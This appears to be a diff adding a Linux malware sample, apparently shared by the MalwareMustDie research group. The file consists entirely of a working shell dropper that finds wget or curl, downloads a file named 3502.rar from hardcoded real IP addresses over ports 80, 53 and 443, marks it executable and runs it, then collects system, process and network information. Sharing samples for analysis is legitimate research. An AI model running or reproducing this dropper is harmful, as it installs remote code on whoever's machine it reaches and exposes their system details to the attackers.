@@ -1,1 +1,45 @@
 
+#MalwareMustDie-snagged this malicious script/credit: @shibumi
+
+export PATH=$PATH:/usr/kerberos/sbin:/usr/kerberos/bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin:/boot/:/usr/:/:/etc/;
+filename="3502.rar";
+path=$filename;
+para="";
+
+rm -rf $path || /dev/null > $path;
+
+i=0;
+
+for d in `echo wget curl`;
+  do i=$(($i+1));
+  command -v $d >/dev/null 2>1 && down=$d && break;
+  type $d >/dev/null 2>1 && down=$d && break;
+  hash $d >/dev/null 2>1 && down=$d && break;
+done;
+
+if [ ! -z $down ]; 
+  then if [ $i == 1 ] ; 
+    then para="";
+    else para=" -s --connect-timeout 30 -O $path ";
+    filename="3502_s.rar";
+  fi; 
+  for list in `echo http://123.108.109.100/ http://123.108.109.100:53/ http://123.108.109.100:443/ http://178.33.196.164/ http://178.33.196.164:53/ http://178.33.196.164:443/`;
+    do $down $para $list$filename >/dev/null 2>1 && break;
+  done ; 
+
+  if [ -f $path ];
+    then chmod +x $path;
+    ./$path && echo InstallOK;
+  fi;
+
+fi;
+
+sleep 1;
+uname -a;
+cat /etc/issue;
+(ps -ef||ps aux||ps x)|grep -v $$;
+netstat -antop||netstat -ano|netstat -an;
+echo ExecOK
+
+#---
+#MalwareMustDie
